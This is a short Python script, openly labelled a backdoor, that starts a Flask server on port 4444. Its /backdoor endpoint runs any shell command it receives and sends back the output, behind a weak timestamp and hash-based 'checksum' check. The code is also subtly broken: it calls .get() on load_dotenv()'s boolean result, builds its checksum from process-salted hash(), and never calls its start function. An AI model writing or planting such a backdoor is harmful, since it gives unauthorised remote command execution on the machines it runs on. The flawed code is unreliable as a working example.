#!/usr/bin/env python3

import os
import socket
import subprocess
import json
import base64
import sys
import shutil
import time
import requests
import dotenv
from flask import Flask, request

# Constants

DEFAULT_PORT = 4444
DEFAULT_MAX_DELAY = 5000
CHECKSUM_KEY = dotenv.load_dotenv().get("CHECKSUM_KEY")
PORT = dotenv.load_dotenv().get("PORT") or DEFAULT_PORT
MAX_DELAY = dotenv.load_dotenv().get("MAX_DELAY") or DEFAULT_MAX_DELAY

if not CHECKSUM_KEY:
    print("No checksum key provided")
    sys.exit(1)

# Simple functions

def whoami() -> str:
    return os.popen('whoami').read()

def is_valid_timestamp(timestamp: str, max_delay: int) -> bool:
    current_time = int(time.time())
    return current_time >= int(timestamp) and current_time < int(timestamp) + max_delay

def compute_checksum(data: str, key: str) -> str:
    if not key or not data or not "data" in data or not "timestamp" in data:
        return "0"
    checksum_string = data["data"] + data["timestamp"] + key
    return str(hash(checksum_string))

def is_valid_checksum(data: dict, key: str, provided_checksum: str) -> bool:
    return "0" != provided_checksum == compute_checksum(data, key)

# Composite functions

# Start Flask server

def start_server():
    
    app = Flask(__name__)

    @app.route("/")
    def index():
        return "Backdoor server is running"

    @app.route("/backdoor", methods=["POST"])
    def backdoor():
        data = request.get_json()
        provided_checksum = request.headers.get("checksum")
        if not is_valid_checksum(data, CHECKSUM_KEY, provided_checksum):
            return "Invalid checksum", 400
        if not is_valid_timestamp(data["timestamp"], MAX_DELAY):
            return "Invalid timestamp", 400
        command = data["data"]
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = process.stdout.read() + process.stderr.read()
        return output.decode()

    app.run(port=PORT)
